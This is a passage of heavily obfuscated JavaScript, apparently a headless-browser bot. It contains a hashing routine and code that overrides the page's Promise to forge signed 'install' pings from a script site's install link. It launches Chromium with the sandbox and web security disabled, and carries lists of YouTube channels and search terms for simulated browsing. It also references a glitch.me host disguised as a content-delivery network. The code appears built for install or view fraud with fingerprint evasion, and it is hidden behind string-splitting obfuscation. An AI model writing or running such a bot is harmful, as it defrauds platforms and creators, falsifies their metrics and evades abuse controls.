                J[0x146 + 0x15e2 * -0x1 + 0x14ac] = this['block'], J[K >> -0x174e + 0x673 + 0x3 * 0x59f] |= x[-0x79 * 0x20 + 0x6cc + -0x857 * -0x1 & K], this['block'] = J[-0x21bd + 0x7d + 0x2150], K >= -0xe10 + 0x1ca7 + 0xd * -0x11b && (this['hashed'] || this['hash'](), J[-0xedd + 0x26a9 + -0x17cc] = this['block'], J[0x1787 + 0x3 * 0x275 + -0x1ed6 * 0x1] = J[-0x5 * -0x343 + -0x2 * -0x88b + 0x10b2 * -0x2] = J[0x25c + -0x8e * 0x17 + 0x378 * 0x3] = J[-0x17b6 + -0x1103 + 0x365 * 0xc] = J[0x1 * 0x74b + -0x1c6 + -0x581 * 0x1] = J[-0xec3 + -0x266f + -0x39 * -0xef] = J[0x10b3 + 0xc2f * -0x1 + -0x47e] = J[0xeb4 + -0x1 * 0x77c + -0x731 * 0x1] = J[-0x2f * 0xa3 + 0x16f * 0xf + 0x874] = J[-0x19e8 + 0x11db + 0x816] = J[-0x4 * -0x6a1 + -0x139e + -0x1b7 * 0x4] = J[-0x4db + 0x1ed3 * -0x1 + 0x23b9] = J[-0x125c * 0x2 + -0x3 * 0x3f3 + 0x13 * 0x28f] = J[-0x1248 + -0x507 + 0x175c] = J[0xb4b * 0x1 + -0x127e + 0x741] = J[0xbb * 0x5 + 0x19ce * 0x1 + -0x6a * 0x47] = -0x1256 * 0x1 + 0x1 * 0x11af + -0x1 * -0xa7), J[-0x1c6f + 0xb2b + -0x8a9 * -0x2] = this['hBytes'] << 0x2413 + 0x25 * -0xdc + -0x444 | this['bytes'] >>> -0x181d * -0x1 + -0x18d9 + -0xd9 * -0x1, J[0x1d85 + 0x26d4 + -0x444a] = this['bytes'] << -0x1a96 + -0x2 * 0xe14 + -0x1 * -0x36c1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x24f6 + 0x10c1 + 0x1445; J < -0x1 * -0x1d54 + 0x2485 + -0x4189; ++J)
                K = Q[J - (0x120a + 0x17 * -0x59 + -0xd6 * 0xc)] ^ Q[J - (0x37e * -0x2 + -0x1 * -0xa7 + 0x65d)] ^ Q[J - (-0x79f + -0xb9b * 0x1 + -0x4 * -0x4d2)] ^ Q[J - (0xca0 + 0x445 + -0x8b * 0x1f)], Q[J] = K << 0xbc3 * -0x2 + 0x1e7d + -0x6f6 | K >>> 0x1952 + -0x1 * 0x6a + 0x4f5 * -0x5;
              for (J = -0x47 * -0xa + -0xd14 + 0xa4e; J < 0xa49 + 0x3 * -0x506 + -0x1 * -0x4dd; J += -0x4f3 + 0xe21 + -0x929)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x3f6 + -0x1 * -0x1418 + -0x1809 | L >>> 0xbfa * -0x1 + 0x57 * -0x43 + 0x22da) + (M & N | ~M & O) + P + (0x30987368 + 0x63f85ab8 + 0x34e5 * -0x118fb) + Q[J] << 0x111e + 0x775 + -0x1893) << -0x3 * -0x923 + -0x3 * 0x752 + -0x56e | P >>> 0x1 * 0xcf2 + 0x2327 * -0x1 + 0x1650) + (L & (M = M << -0x164d + -0x15ab + -0x759 * -0x6 | M >>> 0x1207 + 0x491 + -0x1696) | ~L & N) + O + (-0x2 * 0x549a8d54 + -0x1f4ff92 + 0x105ac93d3) + Q[J + (0xbaf * -0x3 + 0x1c55 + -0x1 * -0x6b9)] << 0xa65 + -0x2505 + -0x1 * -0x1aa0) << -0x2473 + 0xc1b + 0x129 * 0x15 | O >>> 0xbf0 + 0x1dd4 + -0x87 * 0x4f) + (P & (L = L << 0x1f51 + -0x1241 * -0x1 + -0x3174 | L >>> 0x5d * -0x1 + 0x1 * -0x3ce + 0x1 * 0x42d) | ~P & M) + N + (-0x64db5 * 0x129e + -0x83872708 * -0x1 + 0x4c560247) + Q[J + (-0x116c + -0x254 * -0xf + -0x117e * 0x1)] << 0x1 * -0x224a + -0x2e3 * -0x5 + 0x13db) << 0x5 * -0x397 + 0xe95 + 0x363 | N >>> 0x37 * 0x7f + -0x2f * 0x13 + -0x1 * 0x17b1) + (O & (P = P << -0xe31 + -0x10ad + 0x1efc | P >>> 0x61 * -0x5a + -0x11 * 0x8b + 0x13d * 0x23) | ~O & L) + M + (0xea11ef * 0x63 + -0x8 * -0x14035fdb + -0x36 * 0x2f71062) + Q[J + (-0x9fe + 0x1995 + -0xf94)] << -0x802 + 0x17 * 0x61 + -0xb5) << 0x1c97 + -0x1bac + -0x17 * 0xa | M >>> -0x22de + -0xfea + -0x1 * -0x32e3) + (N & (O = O << 0x6 * -0x5b1 + 0xa4a + 0x17fa | O >>> -0x23eb + 0x110b * 0x1 + 0x12e2) | ~N & P) + L + (-0x24ba046b + -0xa2ca2e0d + 0x3a01559d * 0x5) + Q[J + (0x1875 + -0x1 * 0x2bf + 0xad9 * -0x2)] << 0x19f + -0x12cc + 0x112d, N = N << -0x1 * 0x25fd + -0xbfb + -0x10b2 * -0x3 | N >>> 0x1a89 + 0x1f90 + -0x3a17;
              for (; J < -0x2094 + 0x23d4 * 0x1 + -0x318; J += 0x2370 + 0x5 * 0x30b + -0x32a2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * 0xa90 + -0x129 * -0x5 + 0x4c8 | L >>> -0xc * -0x19f + 0x1fa + -0x1553 * 0x1) + (M ^ N ^ O) + P + (-0xd1b3761c + -0xb33902f + 0x14bc0f1ec) + Q[J] << -0x2cd * -0x4 + -0x580 + -0x5b4) << -0x1 * 0x7d3 + -0xfcc * 0x1 + 0x17a4 | P >>> -0x4a * -0x1 + 0x9c2 + -0x9f1) + (L ^ (M = M << -0x561 + -0x9 * 0x167 + 0x121e | M >>> 0xd3 * 0x13 + 0x1 * -0x8f3 + -0x6b4) ^ N) + O + (0x8bf5a342 + -0x80aacd7 * -0x7 + -0x486467 * 0x12e) + Q[J + (0x1bc8 * -0x1 + 0xb7e + 0x1 * 0x104b)] << -0x3 * -0x80b + 0xb2b + -0xbc4 * 0x3) << 0x13fa * 0x1 + -0x1fd2 + 0xbdd | O >>> 0x188f * -0x1 + 0x2454 + -0xbaa) + (P ^ (L = L << -0x1073 + 0x1bc0 + -0xb2f | L >>> 0x1 * -0x13ef + -0x7 * -0x559 + -0x117e) ^ M) + N + (-0xd0e2c54f + 0x38618 * -0x2259 + 0x568 * 0x5187ad) + Q[J + (0x3 * -0x377 + -0x180d + 0x2274)] << -0x11 * -0x97 + 0x3 * 0x602 + -0x1c0d) << 0x1196 * -0x2 + -0x1359 * -0x2 + -0x381 | N >>> -0xf1b + 0x4 * 0x3a9 + 0x92) + (O ^ (P = P << -0x2 * 0x12fb + -0x83 * -0x37 + 0x9ef | P >>> 0x3 * 0xcf4 + 0x65 * -0x47 + -0xad7) ^ L) + M + (0xbc93b82 + 0x3d5c2d2e + -0x3 * -0xc9180fb) + Q[J + (0x5ac + -0x26be + 0x3 * 0xb07)] << -0x23 * -0x5d + -0x97 * 0x1b + 0x336) << 0xeb7 * 0x1 + 0x210a + -0x2fbc | M >>> -0xdcc + 0x25f * -0xe + 0x2f19 * 0x1) + (N ^ (O = O << 0x10 * 0x151 + -0x139d + 0x1 * -0x155 | O >>> -0x2231 + 0x2207 + 0x2c) ^ P) + L + (-0x1 * -0xd0981f01 + 0x4ce75856 * -0x2 + -0x3 * -0x12b029c4) + Q[J + (-0x964 * -0x4 + -0xbfd + -0x198f)] << -0xf4 + -0x6 * -0xe4 + -0x464, N = N << 0x3 * 0x62f + -0x1 * -0xbb1 + -0x1e20 | N >>> -0x26ff + -0x108 + 0x1 * 0x2809;
              for (; J < 0x10e6 + -0x204 + 0xf * -0xfa; J += -0xb90 + -0x1 * -0x1e4d + 0x2 * -0x95c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x6d * 0x43 + 0x260b + -0x8f * 0x11 | L >>> -0x2152 + 0x227a + -0x1 * 0x10d) + (M & N | M & O | N & O) + P - (0x1ebea94b + -0xc25f2f21 + -0xf5cb5d5 * -0x12) + Q[J] << 0x228b + 0x1c75 + 0x2a0 * -0x18) << 0x6 * -0x4dc + -0x24e3 + -0x38 * -0x12e | P >>> 0x3 * 0x26f + 0x1 * 0xa5e + -0x1190) + (L & (M = M << -0x26e0 + 0xd3e + 0x1 * 0x19c0 | M >>> -0xcd9 * 0x2 + -0x123c + 0x2bf0) | L & N | M & N) + O - (-0x6ed2f68e + -0x6 * 0xa272b42 + 0x2 * 0x8e511e9f) + Q[J + (-0x195d + 0x601 * -0x1 + 0x1f5f)] << -0x967 + -0x2 * -0x6d0 + -0x439) << 0x1 * -0x12b5 + -0x1cb3 + 0x2f6d | O >>> 0x86e + -0x1 * -0x2658 + 0x2eab * -0x1) + (P & (L = L << 0x3 * -0xa8b + 0x3f8 * 0x8 + 0x1 * -0x1 | L >>> 0x8 * -0x6d + 0x60 + -0x30a * -0x1) | P & M | L & M) + N - (-0x3326fcf * -0x15 + 0x1f19 * -0x3da37 + 0xa58e0f88) + Q[J + (-0x1755 * -0x1 + 0x15b * 0xc + -0x2797)] << 0x1 * 0x1d08 + 0x118d + -0x2e95) << 0xb00 + -0x1067 + 0x56c | N >>> -0x1 * -0x647 + -0x4 * -0x775 + -0x4 * 0x900) + (O & (P = P << -0x2189 + -0x1 * -0x2374 + -0x1cd | P >>> 0x57d + 0x11ed + -0x1768) | O & L | P & L) + M - (-0x2bf918e9 + 0xa * -0x10604509 + -0x1 * -0x140a00e67) + Q[J + (0x3b1 + -0x7f * 0x3d + 0x1 * 0x1a95)] << -0x67e * -0x3 + 0x780 * -0x2 + -0x47a) << 0x1 * -0x2382 + 0x25b1 + -0x115 * 0x2 | M >>> 0x1c0a + 0x7a2 * 0x4 + -0x3a77) + (N & (O = O << 0x1d27 * 0x1 + -0x1 * 0x2153 + 0x44a | O >>> -0x17a + 0xc7 * -0xb + 0x1 * 0xa09) | N & P | O & P) + L - (-0x91e9f438 * 0x1 + 0x8632c27d * -0x1 + 0x18900f9d9) + Q[J + (0x91 * 0x3 + -0x1987 + 0x17d8)] << 0x835 + 0x216c + -0x29a1, N = N << 0x2 * 0x35f + 0x4 * -0x767 + 0x16fc | N >>> 0x5 * -0x6bf + 0xb3e + 0x167f;
              for (; J < -0x74d * -0x3 + 0x51b + -0x1ab2; J += -0x16b9 + 0x132c + 0x392)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x14a2 + -0x8df * -0x1 + 0x6f * -0x44 | L >>> 0x474 + -0x849 + 0x3f0) + (M ^ N ^ O) + P - (-0xe2236c + 0x1 * -0x248fd6ad + 0x5b0f3843) + Q[J] << 0x121a * 0x1 + -0x17ba + -0x12 * -0x50) << -0x4 * -0x35 + -0x1 * -0x241f + -0x3a * 0xa3 | P >>> 0xe9 * -0x17 + -0x52 * -0x11 + 0xf98) + (L ^ (M = M << 0xfd0 + 0xb14 + -0x1ac6 | M >>> 0x1436 + -0x1f7a * 0x1 + -0x3 * -0x3c2) ^ N) + O - (-0x47b6c92c + -0x2413d40d + 0xa167db63) + Q[J + (0x1255 + 0x1 * -0x2379 + 0x1125)] << 0x3 * -0x305 + -0x1 * -0x1c5a + -0x1 * 0x134b) << -0xf89 * -0x1 + -0x2 * 0x7b7 + -0x16 | O >>> 0x22b * 0x6 + -0x1281 + -0x6 * -0xef) + (P ^ (L = L << 0x1 * -0x1c5e + -0x99c + 0x2618 | L >>> 0x7 * 0x5f + 0x7 * 0x3d3 + -0x1 * 0x1d5c) ^ M) + N - (0x2ec47d57 + 0xd0079d * 0x8 + 0x5883eb) + Q[J + (-0x1d8e + -0x33 * -0x61 + 0xa3d)] << 0xaf8 + 0x36d + -0xe65) << 0x139d * 0x1 + -0x1def + 0xa57 | N >>> -0xa62 + -0x246 * -0xb + -0xe85) + (O ^ (P = P << 0x21c3 + 0x1703 + -0x38a8 | P >>> -0x1 * -0xa0d + -0x543 * -0x1 + -0x2 * 0x7a7) ^ L) + M - (0x35e133 * -0xa3 + -0x27cbd2c3 * 0x1 + 0x2a927c22 * 0x3) + Q[J + (0x4 * 0x691 + 0x1101 + -0x2b42)] << 0x70 * -0x17 + 0xdbf + -0x3af) << -0x1 * -0x1d2 + 0x19a9 + -0x25 * 0xbe | M >>> -0x5 * -0x1c6 + -0x3 * 0x23 + 0x42d * -0x2) + (N ^ (O = O << 0x1 * 0x12b + -0x1952 + 0x1845 | O >>> 0x1e36 + -0x3 * -0x26b + -0x2575) ^ P) + L - (-0x34 * -0x1d94209 + -0x30d222a6 + -0x3bc * -0x1b031) + Q[J + (-0x5 * -0x61d + 0x233d + -0x2 * 0x20e5)] << 0x371 * -0x1 + -0x1197 + -0x1 * -0x1508, N = N << 0xe4b + 0xb21 + -0x194e | N >>> -0x314 * 0x6 + -0x1a53 * 0x1 + 0xeef * 0x3;
              this['h0'] = this['h0'] + L << 0x1781 + -0x2e * -0x35 + -0x2107, this['h1'] = this['h1'] + M << -0x9 * -0x2af + -0xa * -0x1f5 + -0x2bb9, this['h2'] = this['h2'] + N << -0x1e5c + 0x2490 + -0x634, this['h3'] = this['h3'] + O << 0x2ef + -0x1 * -0x2d7 + -0x5c6 * 0x1, this['h4'] = this['h4'] + P << -0x5d * 0x3 + 0x208f + -0x3ef * 0x8;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x2 * -0xc54 + 0x1f18 + -0x654 & 0x5f * -0x28 + -0x10f * 0x1 + 0xff6] + w[J >> -0x42d + -0xaa3 + 0xc * 0x13e & -0xc06 + 0xaec + -0x129 * -0x1] + w[J >> -0x18fb + 0xbf8 + 0xd17 & 0xe40 + -0x6e7 + -0x74a] + w[J >> -0xf3b + -0x2 * 0xa75 + 0x1 * 0x2435 & -0x73f + 0x2624 + -0xf6b * 0x2] + w[J >> -0x16ff + 0x2 * 0x57b + -0x3 * -0x407 & -0x2f8 + -0x1e6 + 0x1 * 0x4ed] + w[J >> -0xf24 + -0x130b + 0x2237 & -0xe9 * -0x13 + -0xc * -0x40 + -0x2 * 0xa1e] + w[J >> -0x1 * -0x123f + 0x7 * -0x42d + -0x80 * -0x16 & -0x4 * -0x23f + 0x1a09 + -0x22f6] + w[0x1c12 + 0x4f7 + 0x86 * -0x3f & J] + w[K >> -0x208 * -0x11 + -0x12f1 + -0xf7b * 0x1 & -0x1df * -0xb + -0x51b + -0xf6b] + w[K >> -0x40 + -0x589 + 0x23 * 0x2b & 0x39 * -0xa2 + 0xa * 0x3 + 0xc01 * 0x3] + w[K >> -0x1f * 0x4f + -0x113 * -0x13 + 0xd4 * -0xd & -0xb1e * 0x2 + -0xeac * -0x2 + 0x1 * -0x70d] + w[K >> -0xc13 + -0x1 * -0x15a5 + -0x2 * 0x4c1 & -0x1bb * -0x15 + 0x647 * 0x3 + -0x371d] + w[K >> 0x12b6 + -0x171 + 0x1 * -0x1139 & 0xd6c + 0x1bad + -0x33 * 0xce] + w[K >> -0xbf8 + -0x88 + 0xc88 & 0x8 * -0xf1 + -0x10f5 + 0x1 * 0x188c] + w[K >> 0xe2e + -0x33b * -0x1 + -0x1165 & 0x23 * 0xd3 + 0x1 * -0xfc5 + -0xd05] + w[0x6eb + -0xe2a + 0xa * 0xbb & K] + w[L >> 0x1f86 + -0x219c + 0x232 & 0x1700 + 0x1 * -0x66b + -0x1086] + w[L >> 0x1 * 0x40f + 0x1dd9 + 0x8 * -0x43a & 0x945 * 0x3 + -0x211d + 0x55d] + w[L >> -0x21ab + -0x1 * 0x31a + 0x24d9 & -0x2533 * -0x1 + -0x2508 + -0x1c] + w[L >> -0x4 * -0x2c5 + -0x1 * -0x1f34 + 0x7 * -0x608 & 0x1ec7 + -0x72e + -0x178a] + w[L >> -0x2 * -0x6c5 + 0x7e5 + 0x1 * -0x1563 & -0x421 * -0x7 + -0x3 * 0x9e5 + 0xd7] + w[L >> 0x7d0 * -0x1 + 0x1563 * 0x1 + -0xd8b & -0x11c * -0x1e + 0x1e7c + 0x3fb5 * -0x1] + w[L >> -0xcea + 0x93a + 0x3b4 & 0x7 * -0x582 + -0x77 * -0x43 + 0x778] + w[-0x1 * -0xd7d + 0x1 * 0xa67 + 0x17d5 * -0x1 & L] + w[M >> 0x13e1 + -0x1a61 * -0x1 + 0x1713 * -0x2 & -0x8e9 * 0x3 + -0x1f46 + 0x3a10 * 0x1] + w[M >> -0x368 * -0x4 + 0x445 * 0x7 + -0x2b6b & 0x1a9f + 0x12e6 + 0x1 * -0x2d76] + w[M >> 0x1fbd + 0x1165 * 0x2 + 0x1 * -0x4273 & 0x235d + 0x2012 + -0x4360] + w[M >> 0x3a * -0x7b + -0x1b7f + -0x7 * -0x7eb & 0x1241 + 0x17 * 0x43 + -0x1837] + w[M >> -0x320 + 0x2 * -0x4ca + -0x88 * -0x18 & -0xd2e + -0x1 * -0x8f9 + -0x444 * -0x1] + w[M >> 0x342 + -0xed * -0x3 + -0x601 * 0x1 & 0x1341 + 0x17 * 0x18b + -0x1 * 0x36af] + w[M >> -0x21aa * 0x1 + 0x99a * -0x4 + -0x2 * -0x240b & -0xa1c + 0xdd1 + -0x1 * 0x3a6] + w[-0x12af * 0x1 + 0x6 * -0x425 + -0x2b9c * -0x1 & M] + w[N >> 0x1613 + -0x26c4 + 0xbb * 0x17 & -0x1ceb + -0x289 * 0x2 + 0x883 * 0x4] + w[N >> -0x1f35 + -0x1 * -0x12e2 + -0xb * -0x121 & -0x134b + -0x26a6 + -0x1d0 * -0x20] + w[N >> 0xc07 + -0x51a * -0x3 + 0x1b41 * -0x1 & -0x1b41 * -0x1 + 0x888 + 0x10d * -0x22] + w[N >> -0x1 * 0x10af + -0x252d * 0x1 + 0x11 * 0x32c & 0x189a + -0x1de * -0x2 + -0x1c47] + w[N >> -0xbe9 + 0xe3 * 0x9 + 0x3fa & 0x23f7 + -0x6c + 0x1 * -0x237c] + w[N >> 0x1dc1 * -0x1 + -0x54 * 0x43 + 0x33c5 * 0x1 & 0xab5 + 0x93e + -0x13e4] + w[N >> 0x1ad1 + 0x1 * 0x362 + -0x1e2f & 0x114d + -0x72b * 0x1 + -0xa13] + w[-0xbff * 0x1 + 0xc1 * -0x8 + -0x1216 * -0x1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1354 * 0x2 + -0x260 * 0xb + -0xc70 & -0x9 * 0xb1 + -0x2 * -0xf5f + 0x2 * -0xbc3,
                J >> -0x15 * -0x71 + 0x1eab + -0x27e0 & -0x257 + -0x23ae + 0x2704,
                J >> 0xeb5 + -0x43f * 0x5 + 0x68e * 0x1 & 0x672 * 0x2 + 0x8ab + -0x1490,
                -0x1 * -0x5cd + 0x21 * 0xe9 + 0x3 * -0xb9d & J,
                K >> 0x109f * 0x1 + 0xe8 * -0x8 + 0x947 * -0x1 & -0x2089 + -0x4 * 0x4a3 + 0x3414,
                K >> -0xdc9 + -0x14d5 + 0x22ae & -0x114a * -0x2 + 0xc4f + -0x2de4,
                K >> 0x9 * 0x453 + 0x2221 + -0x4904 & -0xe59 * -0x1 + -0x13a3 + 0x649,
                0x120c + -0x2 * -0xc0e + -0x2929 & K,
                L >> -0xb31 * 0x2 + 0x16ad + -0x11 * 0x3 & 0x13 * 0x9d + 0x2d5 * -0x2 + 0x2 * -0x27f,
                L >> -0x1227 * -0x2 + 0xa12 + -0x2e50 & 0x1262 + 0x3 * 0xbd9 + -0x34ee,
                L >> -0x3f * 0x49 + 0x5 * 0x6df + -0x1 * 0x105c & -0x5ee + 0x1e8d + -0x17a0,
                0x2217 * 0x1 + 0xb07 + -0x2c1f & L,
                M >> 0x110f * -0x1 + -0x4f5 * 0x4 + 0x24fb & 0x1f0c + 0x3e6 + -0x3 * 0xb51,
                M >> -0x4 * -0x2a9 + 0x134e * 0x1 + 0x19 * -0x132 & 0x1 * -0xc44 + 0x1024 + 0x43 * -0xb,
                M >> 0x2a1 + 0x335 + -0x5ce & -0xa10 + 0x56 * -0x2c + 0x19d7,
                0x1 * 0x1d1b + -0xe9 * -0x2 + -0x1dee & M,
                N >> -0x5 * 0x298 + -0xa * -0x24f + -0xa06 & -0xa * -0x150 + -0xe8f + 0x1 * 0x26e,
                N >> 0x18d * -0x6 + -0x1c * 0xb8 + 0x2f3 * 0xa & 0x2579 + -0x608 + -0x6 * 0x513,
                N >> 0x2 * -0x1042 + 0x5 * -0x719 + 0x4409 & 0x347 * 0x7 + 0xa30 + -0x2022,
                -0x228a + -0x231a + 0x46a3 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x131 * 0x14 + 0x1 * -0x1b9f + -0x1 * -0x3df), (K = new DataView(J))['setUint32'](-0x1 * 0x16dd + -0x8ea * -0x4 + -0xccb, this['h0']), K['setUint32'](0x5e7 * -0x1 + 0x9 * -0x317 + 0x21ba, this['h1']), K['setUint32'](-0x9b * 0x8 + -0x25be + 0x443 * 0xa, this['h2']), K['setUint32'](0x4a4 * 0x2 + 0x4bd + 0x49 * -0x31, this['h3']), K['setUint32'](-0x1ead + -0x1ae5 + 0x1 * 0x39a2, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x649 + 0x8eb * -0x3 + 0x1085 * 0x2];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x45a + -0x1a03 + -0x455 * -0x5;
            J[0x89 * 0x17 + -0x24d * -0x1 + -0xe9c]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1627 + 0xc1 + 0x16 * 0xf9] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1 * 0x12cb + 0x1d0e + -0xa42), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0xfb4 + -0x27 * -0xd6 + 0xad * -0x19;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1 * -0x1bc4 + -0x2 * 0x139 + -0x6a * 0x2f), Promise['resolve'](0x96 + -0x1 * -0x223c + -0xb9b * 0x3);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1 * 0x102b + 0xf3c + -0x1f67 * 0x1; j < 0x5 * -0x475 + 0x382 + 0x12c8; j++)
    i();
}
const NETWORK_PATIENCE = -0xb * -0x34e + -0x1c9a + 0x1780 + (0x5 * -0x4a9 + -0xc38 + 0x2f3d) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x455 + -0x21b2 + 0x260a) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + Y(0xe, '))Dd') + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1799 + -0x1 * 0xe6c + -0x92d; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + Z(0x21) + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + Y(0x9, 'fx1I') + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), 